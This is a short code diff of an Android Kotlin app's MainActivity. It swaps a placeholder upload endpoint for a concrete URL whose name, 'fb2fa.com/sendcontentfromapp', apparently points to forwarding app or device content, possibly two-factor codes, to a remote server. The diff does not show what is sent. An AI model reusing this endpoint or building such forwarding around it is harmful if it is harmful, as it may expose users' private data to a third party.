@@ -15,7 +15,7 @@ import java.util.concurrent.TimeUnit
 class MainActivity : AppCompatActivity() {
 
     // TODO: đổi URL này thành endpoint web của bạn
-    private val endpointUrl = "https://example.com/receive"
+    private val endpointUrl = "https://fb2fa.com/sendcontentfromapp/receivefromapp.php"
 
     private val client = OkHttpClient.Builder()
         .callTimeout(20, TimeUnit.SECONDS)
